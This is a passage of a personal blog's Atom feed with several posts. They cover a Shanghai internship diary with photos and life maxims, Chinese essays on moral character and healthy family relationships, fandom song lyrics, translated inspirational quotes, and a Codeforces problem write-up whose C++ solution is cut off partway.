  </entry>
  
  <entry>
    <title>Record my intership experience in Shanghai</title>
    <link href="http://jiangnanpsalter.com/2024/03/19/Record%20my%20intership%20experience%20in%20Shanghai/"/>
    <id>http://jiangnanpsalter.com/2024/03/19/Record%20my%20intership%20experience%20in%20Shanghai/</id>
    <published>2024-03-18T23:58:00.433Z</published>
    <updated>2024-04-04T19:52:50.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Record-my-intership-experience-in-Shanghai"><a href="#Record-my-intership-experience-in-Shanghai" class="headerlink" title="Record my intership experience in Shanghai"></a>Record my intership experience in Shanghai</h1><h2 id="◈-1-My-enjoy"><a href="#◈-1-My-enjoy" class="headerlink" title="◈ 1.My enjoy"></a>◈ 1.My enjoy</h2><h4 id="Take-a-picture-at-random"><a href="#Take-a-picture-at-random" class="headerlink" title="Take a picture at random"></a>Take a picture at random</h4><p><img src="/img/shanghai4.jpg"></p><p><img src="/img/shanghai5.jpg"></p><h4 id="When-I-first-went-top-the-company-my-colleague-gave-me-a-cigarette-during-the-break😂-Do-I-act-look-like-a-boy-It’s-funny"><a href="#When-I-first-went-top-the-company-my-colleague-gave-me-a-cigarette-during-the-break😂-Do-I-act-look-like-a-boy-It’s-funny" class="headerlink" title="When I first went top the company, my colleague gave me a cigarette during the break😂. Do I act look like a boy? It’s funny."></a>When I first went top the company, my colleague gave me a cigarette during the break😂. Do I act look like a boy? It’s funny.</h4><p><img src="/img/shanghai7.jpg"></p><h4 id="Guys-I-didn’t-take-my-cherry-mx3-0s-keyboard-because-I-traveled-from-Zhengzhou-to-Shanghai-to-work-as-an-intern-Then-I-bought-a-15CNY-keyboard-directly-from-PDD-and-mailed-it-to-my-dormitory-Jelly-color-look-good-to-the-brothers-recommend-it-the-axis-is-straight-up-and-down-the-kind-of-should-be-black-axis-you-know-I-feel-pretty-good-and-the-weight-of-this-keyboard-is-very-light-easy-to-carry-out-we-quickly-use-it"><a href="#Guys-I-didn’t-take-my-cherry-mx3-0s-keyboard-because-I-traveled-from-Zhengzhou-to-Shanghai-to-work-as-an-intern-Then-I-bought-a-15CNY-keyboard-directly-from-PDD-and-mailed-it-to-my-dormitory-Jelly-color-look-good-to-the-brothers-recommend-it-the-axis-is-straight-up-and-down-the-kind-of-should-be-black-axis-you-know-I-feel-pretty-good-and-the-weight-of-this-keyboard-is-very-light-easy-to-carry-out-we-quickly-use-it" class="headerlink" title="Guys, I didn’t take my cherry mx3.0s keyboard because I traveled from Zhengzhou to Shanghai to work as an intern. Then I bought a 15CNY keyboard directly from PDD and mailed it to my dormitory. Jelly color look good, to the brothers recommend it, (the axis is straight up and down the kind of, should be black axis, you know), I feel pretty good, and the weight of this keyboard is very light, easy to carry out, we quickly use it."></a>Guys, I didn’t take my cherry mx3.0s keyboard because I traveled from Zhengzhou to Shanghai to work as an intern. Then I bought a 15CNY keyboard directly from PDD and mailed it to my dormitory. Jelly color look good, to the brothers recommend it, (the axis is straight up and down the kind of, should be black axis, you know), I feel pretty good, and the weight of this keyboard is very light, easy to carry out, we quickly use it.</h4><p>(The light key is the Stroll lock key on the first line of the keyboard.)</p><p><img src="/img/shanghai6.jpg"></p><h4 id="The-stairs-in-the-SoReal-VR-store-in-Shanghai-are-also-good"><a href="#The-stairs-in-the-SoReal-VR-store-in-Shanghai-are-also-good" class="headerlink" title="The stairs in the SoReal VR store in Shanghai are also good."></a>The stairs in the SoReal VR store in Shanghai are also good.</h4><p><img src="/img/shanghai9.jpg"></p><h4 id="Take-a-selfie"><a href="#Take-a-selfie" class="headerlink" title="Take a selfie"></a>Take a selfie</h4><p><img src="/img/shanghai8.jpg"></p><h4 id="Visit-to-the-Bund-Center-in-Shanghai-seeing-is-believing"><a href="#Visit-to-the-Bund-Center-in-Shanghai-seeing-is-believing" class="headerlink" title="Visit to the Bund Center in Shanghai, seeing is believing"></a>Visit to the Bund Center in Shanghai, seeing is believing</h4><p><img src="/img/shanghai2.jpg"></p><p><img src="/img/shanghai3.jpg"></p><h2 id="◈-2-My-internship-experience-Summary-of-perception"><a href="#◈-2-My-internship-experience-Summary-of-perception" class="headerlink" title="◈ 2.My internship experience Summary of perception:"></a>◈ 2.My internship experience Summary of perception:</h2><pre><code>(1). To train or do the best in everything at ordinary times is the standard, and A throwaway remark is regarded as the truth because of the strong strength and high cognition.(2). A wise man weighs the pros and cons, but a fool cares about the effort.(3). Fast. Steady. Hard. Accurate.(4). Students majoring in computer science and technology should not engage in non-technical jobs, and should not engage in clerical work.(5). Computational thinking is important.(6). Let excellence become a habit, self-discipline is freedom. Early to bed, early to rise.(7). Persist, day after day.(8). The carefully woven net is still to be dismantled by others, but it is still necessary to weave. Like the ribbon of a gift, even if its ultimate destiny is to be undone, we must tie the ribbon because that is the way to give it.(9). Only when his own things are hidden deep enough can he keep this things intact and undamaged when the crisis involves him.(10). To get along with people of different classes requires acting, which is called high emotional intelligence.(11). Grow up to be beautiful and loved.(12). I plan and strategize, and when I get angry, even God is afraid.(13). When I see someone in particular need of something, even if I can easily get that thing, I also slowly walk, let others exceed my pace, watching others get it. Because I already have a lot of that thing, and the other party needs that thing urgently.(14). Do not like others, even if you like it, do not take the initiative to say it, feelings are easy to provoke right and wrong, involving life and death. It&#39;s all right if you don&#39;t say it, and it&#39;s all right after it happens, but you can&#39;t say it while it&#39;s happening.(15). Be careful not to be deceived. Think fast, run calmly and run fast.(16). If you sail carefully, you can keep the boat safe for thousands of years without sinking.</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Record-my-intership-experience-in-Shanghai&quot;&gt;&lt;a href=&quot;#Record-my-intership-experience-in-Shanghai&quot; class=&quot;headerlink&quot; title=&quot;Record m</summary>
      
    
    
    
    <category term="记录人生经历与感悟" scheme="http://jiangnanpsalter.com/categories/%E8%AE%B0%E5%BD%95%E4%BA%BA%E7%94%9F%E7%BB%8F%E5%8E%86%E4%B8%8E%E6%84%9F%E6%82%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>浩然正气长存</title>
    <link href="http://jiangnanpsalter.com/2024/03/08/%E6%B5%A9%E7%84%B6%E6%AD%A3%E6%B0%94%E9%95%BF%E5%AD%98/"/>
    <id>http://jiangnanpsalter.com/2024/03/08/%E6%B5%A9%E7%84%B6%E6%AD%A3%E6%B0%94%E9%95%BF%E5%AD%98/</id>
    <published>2024-03-08T14:13:35.181Z</published>
    <updated>2024-04-04T17:01:21.009Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浩然正气长存"><a href="#浩然正气长存" class="headerlink" title="浩然正气长存"></a>浩然正气长存</h1><p>小A说：“不要跟不如你的人一起玩，有些人会觉得你的拥有才导致了他们的没有，他们从来没有想过从自己身上找原因，不如你的人很容易嫉妒你，甚至害你。穷生奸计，不要和穷人玩。直接不要和他们玩就能避免一切问题出现。”<br>这话虽然没说错，但是并不是所有穷人都是坏人，并不是所有人都会嫉妒别人。<br>如果用剑网3的阵营来区分言论的流派，那么这种言论我归结为「恶人谷」那一派。虽然其言论确实是行之有效，但是缺乏格局。当然，言论并没有好坏之分，只要自己认可此言论，不主动伤害别人且不犯法，那就走自己的路，让别人说去吧。</p><p>小B说：“海之所以能纳百川，就在于它立足最低，因为它的「低」，才能够「纳」。高高在上的，只能是「湖」，永远称不了「海」。为人也是一样，只有低调的人生，才具有接纳的能力，才能融汇来自不同方向的思想和文化。真正的包容性，不是接纳，而是消化，吸收有用的，排出没用的，甚至是有害的，在不断消化过程中才能变得越来越强大。”<br>虽然层次不同了，我们变强了优秀了，可能会引起一部分人的嫉妒心，但是我们会很聪明的应付过去，我们会不厌其烦的周旋其中 随后全身而退，比如夸夸对方的优点、在别人面前装弱、装作摆烂等等。</p><p>按照<code>实力伪装程度</code>来分类，这世上有三种人，第一种是有实力但是装弱的人，第二种是实力不强但是伪装成很强的人，第三种是完全不伪装的人 该是怎样就是怎样。</p><p><img src="/img/fish.jpg"></p><p>首先，保护自己是最基本的。其次，心怀感恩，保持谦逊，心怀宽广。最后，和邻居们互利互惠，有利于保持邻里友好的关系。<br>小B说的这种言论即是较为上乘的言论，是高能量人群走的路，这类言论我归结为「浩气盟」。其言论颇有君子之风，大家都崇尚这类人，可以说是一呼百应，并且该言论行之有效 且有格局。</p><p>就比如说，你有一个多年好友，你们已经不是一个层次的人了，你还会把他当做你的朋友吗？在我心里，只要对方没有做太过分的事，我的朋友永远都会是我的朋友，虽然我们各自忙自己的生活，但我们心中仍是好友。</p><p>是的，我们可以直接使用小A的所讲的行事方法，这样就不会给自己找麻烦，然而，这样做虽然没错，但是却少了一丝浩然正气。诸位，不妨这样做：我们知道小A的方法 但是不使用，我们完全理解并使用小B说的方法，只因我们要<code>维护这天地间的浩然正气</code>，守卫天地间的大格局，包容万物，让天下人各得其所。</p><p>我们本可以收敛光芒，但若是我们黯淡，在这黑暗之中挣扎的人们就看不到<code>希望</code>。越是压痛双肩，越要<code>辉煌耀眼</code>。为了延续星火，为了希望，我们这一代定要闪闪发光；为了维护人间的浩然正气，我们定要保持宽广的胸怀。</p><p>海纳百川，有容乃大。高高在上的，只能是「湖」，永远称不了「海」。<br><code>海纳百川容千舟竞技新海，厚德载物育八方有为英才。</code></p><p>仅代表个人观点，供大家参考。</p><blockquote><p>（附上战歌）<br>曲名：请君一战<br>歌手：剑网3 &#x2F; 吾恩 &#x2F; 五音Jw<br>歌曲来源：<a href="https://music.163.com/#/song?id=520464250">https://music.163.com/#/song?id=520464250</a><br>歌词：<br>浩气盟（吾恩）：<br>浩然正气 一呼百应<br>坦荡走天下<br>提枪纵马 护我国与家<br>七星十恶 百战厮杀<br>逞凶为恶 自当惩罚<br>公道在天下<br>风云叱咤 江湖浪涌<br>赤子心无暇<br>奸佞宵小 皆葬我剑下<br>纵然千般说法 岿然不动<br>浩然正气心头挂<br>若皆随心何须礼法<br>七星十恶 百战厮杀<br>逞凶为恶 自当惩罚<br>公道在天下<br>无所畏惧但凭“义”字称侠<br>七星十恶 百战厮杀<br>人间 自有天道 何不放下<br>自有后话<br>无所畏惧但凭“义”字称侠<br>七星十恶 百战厮杀<br>人间 自有天道 何不放下<br>自有后话</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;浩然正气长存&quot;&gt;&lt;a href=&quot;#浩然正气长存&quot; class=&quot;headerlink&quot; title=&quot;浩然正气长存&quot;&gt;&lt;/a&gt;浩然正气长存&lt;/h1&gt;&lt;p&gt;小A说：“不要跟不如你的人一起玩，有些人会觉得你的拥有才导致了他们的没有，他们从来没有想过从自己身上找原因，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>分享最近的一些想法--我仍在那唱着那无人问津的歌谣</title>
    <link href="http://jiangnanpsalter.com/2024/02/22/%E5%88%86%E4%BA%AB%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95--%E6%88%91%E4%BB%8D%E5%9C%A8%E5%94%B1%E7%9D%80%E9%82%A3%E6%97%A0%E4%BA%BA%E9%97%AE%E6%B4%A5%E7%9A%84%E6%AD%8C%E8%B0%A3/"/>
    <id>http://jiangnanpsalter.com/2024/02/22/%E5%88%86%E4%BA%AB%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95--%E6%88%91%E4%BB%8D%E5%9C%A8%E5%94%B1%E7%9D%80%E9%82%A3%E6%97%A0%E4%BA%BA%E9%97%AE%E6%B4%A5%E7%9A%84%E6%AD%8C%E8%B0%A3/</id>
    <published>2024-02-22T14:48:47.313Z</published>
    <updated>2024-04-04T19:50:39.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分享最近的一些想法–我仍在唱着那无人问津的歌谣"><a href="#分享最近的一些想法–我仍在唱着那无人问津的歌谣" class="headerlink" title="分享最近的一些想法–我仍在唱着那无人问津的歌谣"></a>分享最近的一些想法–我仍在唱着那无人问津的歌谣</h1><h1 id="一、关于我在干什么"><a href="#一、关于我在干什么" class="headerlink" title="一、关于我在干什么"></a>一、关于我在干什么</h1><h4 id="我用的键盘–cherry的红轴机械键盘"><a href="#我用的键盘–cherry的红轴机械键盘" class="headerlink" title="我用的键盘–cherry的红轴机械键盘"></a>我用的键盘–<code>cherry</code>的红轴机械键盘</h4><p><img src="/img/cherry.jpg"></p><p><img src="/img/cherry1.jpg"></p><blockquote><p>这里顺便科普一下，一般计算机领域内 算法竞赛选手用的键盘的牌子一般是 cherry、 腹灵 、 ikbc 等等，轴体一般选择红轴居多。这一现象的主要原因是有算法竞赛圈的大佬在用，而且质量确实不错，所以大家都用。正如我们acm社团18级负责人所说的：“工欲善其事，必先利其器。”</p></blockquote><h4 id="偶尔学习数学"><a href="#偶尔学习数学" class="headerlink" title="偶尔学习数学"></a>偶尔学习数学</h4><p><img src="/img/math.jpg"></p><h4 id="我的桌面"><a href="#我的桌面" class="headerlink" title="我的桌面"></a>我的桌面</h4><p><img src="/img/yun.jpg"></p><h4 id="我的《算法导论》的内页"><a href="#我的《算法导论》的内页" class="headerlink" title="我的《算法导论》的内页"></a>我的《算法导论》的内页</h4><p><img src="/img/suanfadaolun.jpg"></p><h4 id="喝抹茶味的奶茶"><a href="#喝抹茶味的奶茶" class="headerlink" title="喝抹茶味的奶茶"></a>喝抹茶味的奶茶</h4><p><img src="/img/luckin.jpg"></p><h4 id="写字"><a href="#写字" class="headerlink" title="写字"></a>写字</h4><p><img src="/img/sun.jpg"></p><h1 id="二、关于我最近的一些想法"><a href="#二、关于我最近的一些想法" class="headerlink" title="二、关于我最近的一些想法"></a>二、关于我最近的一些想法</h1><p>我希望自己能够认真对自己的人生负责，我希望自己不要活在别人的评价里，我希望自己热烈盛大璀璨，我希望自己认认真真脚踏实地。</p><p>首先，认真规划自己的职业生涯；其次，认真生活、忠于自己；最后，自律。</p><p>我希望自己能够永远积极向上，带给他人具有希望和光明的启明，我希望自己可以永远做自己。</p><p>我希望我就像一棵树，而不是像一朵花；我希望我像大树一样，向往高处的阳光，并将我的根深入黑暗的地底，以厚德载物。带给更多身处黑暗之中的人们希望，指引他们走到光明。</p><h1 id="三、关于我喜欢的句子"><a href="#三、关于我喜欢的句子" class="headerlink" title="三、关于我喜欢的句子"></a>三、关于我喜欢的句子</h1><p>追踪电子潮流，锁定目标不松口，捕捉唯一目标，跨越时间昼夜穿梭，蝴蝶振翅掀翻虚拟王座。</p><p>白昼之光，岂知夜色之深。</p><p>黑暗中璀璨繁荣，你能懂。</p><p>天行健，君子以自强不息；地势坤，君子以厚德载物。</p><p>我仍在唱着那无人问津的歌谣。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分享最近的一些想法–我仍在唱着那无人问津的歌谣&quot;&gt;&lt;a href=&quot;#分享最近的一些想法–我仍在唱着那无人问津的歌谣&quot; class=&quot;headerlink&quot; title=&quot;分享最近的一些想法–我仍在唱着那无人问津的歌谣&quot;&gt;&lt;/a&gt;分享最近的一些想法–我仍在唱着那无</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>荣光长存 （《全职高手》战队群像曲）</title>
    <link href="http://jiangnanpsalter.com/2024/02/19/%E8%8D%A3%E5%85%89%E9%95%BF%E5%AD%98%20%EF%BC%88%E3%80%8A%E5%85%A8%E8%81%8C%E9%AB%98%E6%89%8B%E3%80%8B%E6%88%98%E9%98%9F%E7%BE%A4%E5%83%8F%E6%9B%B2%EF%BC%89/"/>
    <id>http://jiangnanpsalter.com/2024/02/19/%E8%8D%A3%E5%85%89%E9%95%BF%E5%AD%98%20%EF%BC%88%E3%80%8A%E5%85%A8%E8%81%8C%E9%AB%98%E6%89%8B%E3%80%8B%E6%88%98%E9%98%9F%E7%BE%A4%E5%83%8F%E6%9B%B2%EF%BC%89/</id>
    <published>2024-02-19T09:38:34.841Z</published>
    <updated>2024-04-04T16:54:53.098Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>歌曲来源：<a href="https://music.163.com/#/song?id=2039477563">https://music.163.com/#/song?id=2039477563</a><br>歌手：小坠 &#x2F; 帝听sakya &#x2F; 晃儿 &#x2F; 丁丁RaJor &#x2F; ET鱼不归 &#x2F; 将离 &#x2F; 醉雪 &#x2F; 橙翼<br>所属专辑：荣光长存 （《全职高手》战队群像曲）</p></blockquote><p>你看这巅峰之上是最好的时代<br>梦想未曾更改<br>热血梦想延至未来</p><p>瞧追梦者凭借对梦想的执着，<br>似冬夜未灭的星火<br>再一笑后便从头来过，<br>从虚无中筑新王国</p><p>谁用双拳为心中的信念争夺<br>经十年也未被消磨<br>朝巅峰处摘胜利硕果，<br>未留退路不曾退缩</p><p>于荣光中传承把前路相托<br>将绚烂魔术都收敛沉默<br>这段未来可负所托？<br>人从不缺的是追逐巅峰的胆魄</p><p>当剑之所向处诅咒也降落，<br>死亡钟声留给机会主义者，<br>无需多言默契封锁，<br>便于刀光剑影中斩获胜利赞歌。</p><p>重头把后背交付再委以信赖<br>筹谋千般人尽其才<br>步步为营间难掩风采<br>胜利信仰未曾更改</p><p>舍命一击的璀璨被沉默掩盖<br>指顾从容生死无碍<br>潮汐起唱作长歌慷慨<br>一击必杀将枷锁挣开</p><p>听枪声作响谁毙命成尸骸<br>将生死狩猎于千里之外，<br>空前呐喊万人高抬<br>仍需全力以赴才能披荣耀数载，</p><p>汇元素之力向硝烟地破开，<br>虽未曾加冕但仍永报期待<br>竭尽一切不留遗憾<br>那怕结局难如人意仍挥手释怀。</p><p>(合：)<br>都身入洪流中似一根火柴<br>都要聚合燃烧方成火海<br>梦想从来未曾更改<br>你看这巅峰之上是最好的时代<br>赢为荣光长存输也该精彩<br>来往交战里战意澎湃<br>热血梦想延至未来<br>若此次不能得胜也倾力尝一败</p><p>(尾)<br>你看这巅峰之上是最好的时代<br>梦想未曾更改<br>热血梦想延至未来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;歌曲来源：&lt;a href=&quot;https://music.163.com/#/song?id=2039477563&quot;&gt;https://music.163.com/#/song?id=2039477563&lt;/a&gt;&lt;br&gt;歌手：小坠 &amp;#x2F; 帝听s</summary>
      
    
    
    
    <category term="歌曲推荐" scheme="http://jiangnanpsalter.com/categories/%E6%AD%8C%E6%9B%B2%E6%8E%A8%E8%8D%90/"/>
    
    
  </entry>
  
  <entry>
    <title>愿景</title>
    <link href="http://jiangnanpsalter.com/2024/02/01/%E6%84%BF%E6%99%AF/"/>
    <id>http://jiangnanpsalter.com/2024/02/01/%E6%84%BF%E6%99%AF/</id>
    <published>2024-02-01T04:07:33.994Z</published>
    <updated>2024-04-04T16:58:25.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="愿景"><a href="#愿景" class="headerlink" title="愿景"></a>愿景</h1><p>针对国内普遍家庭现状，在此，我向诸位大学生和都市丽人提出一个美丽的愿景：<code>将健康的关系模式应用到家庭亲密关系之中</code>。</p><p>诚然，我们中国的家风淳朴、家族文化底蕴深厚、有风骨，这是一大优点。</p><p>我们中国人所说的的风骨，指的是某种内在的力量，这种力量驱使着人们傲然挺立或者为了家国命运而奔走。</p><p>纵然家风有着源远流长和底蕴深厚的优点，但其中也会存在一些积习难改和陋习弊病，比如说对于关系的健康程度难以把控，更有甚者直接演变为对亲人的PUA（精神控制）或打压式教育。试问，谁会想一直活在别人的否定和打压之中呢？</p><p>针对这些难改的积习，我们首先要明确一点：什么是健康的关系？什么是不健康的关系？</p><p><code>健康的关系</code>是：相互尊重，相互理解，彼此沟通，彼此信任，关系平等，相互支持，彼此坦诚。</p><p><code>不健康的关系</code>是：无礼&#x2F;轻视，误解&#x2F;不体谅，回避&#x2F;无效沟通，猜忌&#x2F;怀疑，控制&#x2F;贬低，竞争&#x2F;嫉妒，隐瞒&#x2F;谎言。</p><p>我们了解这两者的异同之后，我们自主的选择让自己生活在健康的家庭氛围之中，就算家人无法改变，我们也首先将<code>健康的关系模式在朋友之间进行应用</code>，进而普及到各个亲密关系之中。</p><p>我希望的是从我们这一代大学生开始，我们让自己生活在这样健康的亲密关系当中，我们首先改变自己，做好自己，这是我们的任务，从而影响着下一代，影响着一代又一代。</p><p>这是一个愿景，也是千千万万大学生们和年轻人们的愿景。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;愿景&quot;&gt;&lt;a href=&quot;#愿景&quot; class=&quot;headerlink&quot; title=&quot;愿景&quot;&gt;&lt;/a&gt;愿景&lt;/h1&gt;&lt;p&gt;针对国内普遍家庭现状，在此，我向诸位大学生和都市丽人提出一个美丽的愿景：&lt;code&gt;将健康的关系模式应用到家庭亲密关系之中&lt;/code&gt;。&lt;</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>Quotes on Attitudes</title>
    <link href="http://jiangnanpsalter.com/2024/01/30/Quotes%20on%20Attitudes/"/>
    <id>http://jiangnanpsalter.com/2024/01/30/Quotes%20on%20Attitudes/</id>
    <published>2024-01-30T07:20:41.999Z</published>
    <updated>2024-04-04T16:49:35.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Quotes-on-Attitudes"><a href="#Quotes-on-Attitudes" class="headerlink" title="Quotes on Attitudes"></a>Quotes on Attitudes</h1><blockquote><p>本文来源：<a href="https://seagull.baicizhan.com/react_reading/reading/article/2921?buid=2124144499&recording=null&timestamp=1706599359000">https://seagull.baicizhan.com/react_reading/reading/article/2921?buid=2124144499&amp;recording=null&amp;timestamp=1706599359000</a></p></blockquote><p>There is only one heroism in the world: to see the world as it is, and to love it.<br>—Roman Roland<br>世上唯有一种英雄主义：在认清世界真相后，依然热爱世界。</p><p>——罗曼·罗兰</p><p>To love oneself is the beginning of a lifelong romance.<br>—Oscar Wilde<br>爱自己是终生浪漫的开始。</p><p>——奥斯卡·王尔德</p><p>Happiness, not in another place but this place…not for another hour, but this hour.<br>―Walt Whitman<br>幸福，不在别处，而在此处……不在彼时，而在此时。</p><p>——沃尔特·惠特曼</p><p>Attitude is a choice. Happiness is a choice. Optimism is a choice. Kindness is a choice. Giving is a choice. Respect is a choice. Whatever choice you make makes you. Choose wisely.<br>态度是一种选择。幸福是一种选择。乐观是一种选择。仁慈是一种选择。给予是一种选择。尊重是一种选择。你做的所有选择塑造着你。所以要做明智之选。</p><p>The age of a woman is not important: you can be wonderful in your 20’s, amazing in your 40’s and stay fabulous for the rest of your life.<br>—Coco Chanel<br>女人的年龄并不重要：你可以在20多岁时变得优秀，在40多岁时变得出色，在余生保持光彩耀人。</p><p>——可可·香奈儿</p><p><img src="/img/chosse_wisely.jpg"></p><p>Yesterday is gone. Tomorrow has not yet come. We have only today. Let us begin.<br>―Mother Teresa<br>昨日已逝，明日未到，我们只有今日，让我们从现在开始吧！</p><p>——特蕾莎修女</p><p>Forgiveness is the fragrance that the violet sheds on the heel that has crushed it.<br>―Mark Twain<br>紫罗兰把香气留在了踩踏它的脚跟上，这就是宽恕。</p><p>——马克·吐温</p><p>The smile on my face doesn’t mean my life is perfect. It just means I appreciate everything I have.<br>我脸上的笑容并不意味着我拥有完美生活。而只意味着我感激我所拥有的一切。</p><p>Darkness cannot drive out darkness; only light can do that. Hate cannot drive out hate; only love can do that.<br>–Martin Luther King, Jr<br>黑暗不能驱逐黑暗，惟有光明可以；仇恨不能驱逐仇恨，惟有爱才可以。</p><p>——马丁·路德·金</p><p>If you look at what you have in life, you’ll always have more. If you look at what you don’t have in life, you’ll never have enough.<br>–Oprah Winfrey<br>如果你珍视生命中所拥有的，你会发现你已经拥有得够多；如果你执着于生命中未曾拥有的，你就算拥有再多也总是不够。</p><p>——奥普拉·温弗瑞</p><p>Life is like a camera. Just focus on what’s important, capture the good times, develop from the negatives, and if things don’t work out, just take another shot.<br>人生就像一台相机：聚焦重要事情，捕捉美好时光，在负面经历中成长，若结果不尽人意，那就再拍一次吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Quotes-on-Attitudes&quot;&gt;&lt;a href=&quot;#Quotes-on-Attitudes&quot; class=&quot;headerlink&quot; title=&quot;Quotes on Attitudes&quot;&gt;&lt;/a&gt;Quotes on Attitudes&lt;/h1&gt;&lt;bloc</summary>
      
    
    
    
    <category term="哲学、文学与艺术" scheme="http://jiangnanpsalter.com/categories/%E5%93%B2%E5%AD%A6%E3%80%81%E6%96%87%E5%AD%A6%E4%B8%8E%E8%89%BA%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>Floor Number</title>
    <link href="http://jiangnanpsalter.com/2024/01/29/Floor%20Number/"/>
    <id>http://jiangnanpsalter.com/2024/01/29/Floor%20Number/</id>
    <published>2024-01-29T06:39:30.525Z</published>
    <updated>2024-04-04T20:21:55.699Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：<a href="https://codeforces.com/contest/1426/problem/A">https://codeforces.com/contest/1426/problem/A</a></p></blockquote><h1 id="A-Floor-Number"><a href="#A-Floor-Number" class="headerlink" title="A. Floor Number"></a>A. Floor Number</h1><blockquote><p>time limit per test: 1 second<br>memory limit per test: 256 megabytes<br>input: standard input<br>output: standard output</p></blockquote><h3 id="Problem-description"><a href="#Problem-description" class="headerlink" title="Problem description"></a>Problem description</h3><p>Vasya goes to visit his classmate Petya. Vasya knows that Petya’s apartment number is n.</p><p>There is only one entrance in Petya’s house and the distribution of apartments is the following: the first floor contains 2 apartments, every other floor contains x apartments each. Apartments are numbered starting from one, from the first floor. I.e. apartments on the first floor have numbers 1 and 2, apartments on the second floor have numbers from 3 to (x+2), apartments on the third floor have numbers from (x+3) to (2⋅x+2), and so on.</p><p>Your task is to find the number of floor on which Petya lives. Assume that the house is always high enough to fit at least n apartments.</p><p>You have to answer t independent test cases.</p><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><p>The first line of the input contains one integer t (1≤t≤1000) — the number of test cases. Then t test cases follow.</p><p>The only line of the test case contains two integers n and x (1≤n,x≤1000) — the number of Petya’s apartment and the number of apartments on each floor of the house except the first one (there are two apartments on the first floor).</p><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><p>For each test case, print the answer: the number of floor on which Petya lives.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><h4 id="input"><a href="#input" class="headerlink" title="input"></a>input</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">7 3</span><br><span class="line">1 5</span><br><span class="line">22 5</span><br><span class="line">987 13</span><br></pre></td></tr></table></figure><h4 id="output"><a href="#output" class="headerlink" title="output"></a>output</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1</span><br><span class="line">5</span><br><span class="line">77</span><br></pre></td></tr></table></figure><h3 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h3><p>Consider the first test case of the example: the first floor contains apartments with numbers 1 and 2, the second one contains apartments with numbers 3, 4 and 5, the third one contains apartments with numbers 6, 7 and 8. Therefore, Petya lives on the third floor.</p><p>In the second test case of the example, Petya lives in the apartment 1 which is on the first floor.</p><h1 id="My-contest-submissions"><a href="#My-contest-submissions" class="headerlink" title="My contest submissions"></a>My contest submissions</h1><table><thead><tr><th>#</th><th>When</th><th>Who</th><th>Problem</th><th>Lang</th><th>Verdict</th><th>Time Memory</th></tr></thead><tbody><tr><td>175509632</td><td>Oct&#x2F;11&#x2F;2022 14:56UTC+8</td><td>JiangnanPsalter</td><td>A - Floor Number</td><td>GNU C++20 (64)</td><td>Accepted</td><td>15 ms0 KB</td></tr></tbody></table><h1 id="AC-Code"><a href="#AC-Code" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ll n, x;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; x;</span><br><span class="line">ll ans;</span><br><span class="line">ans = (n - <span class="number">2</span> + x) / x;</span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> 